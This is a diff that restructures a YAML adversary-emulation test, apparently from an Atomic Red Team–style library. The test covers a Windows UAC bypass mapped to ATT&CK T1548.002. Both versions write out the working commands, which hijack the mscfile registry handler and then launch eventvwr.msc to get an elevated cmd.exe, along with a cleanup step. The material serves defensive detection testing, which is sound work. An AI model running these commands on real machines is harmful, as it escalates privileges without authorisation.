@@ -1,17 +1,18 @@
-- id: 762b26d2-4d8f-5189-b15f-4962931b8f5e
+- requirements: []
   name: Soumaia ART Tests - Bypass UAC using Event Viewer (cmd)
   description: 'Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
 
     Upon execution command prompt should be launched with administrative privileges.'
   tactic: privilege-escalation
-  technique:
-    attack_id: T1548.002
-    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
-          cmd.exe /c eventvwr.msc
-        cleanup: |-
-          reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
+  technique_id: T1548.002
+  technique_name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  executors:
+  - cleanup:
+    - reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f & cmd.exe /c eventvwr.msc
+  id: 762b26d2-4d8f-5189-b15f-4962931b8f5e
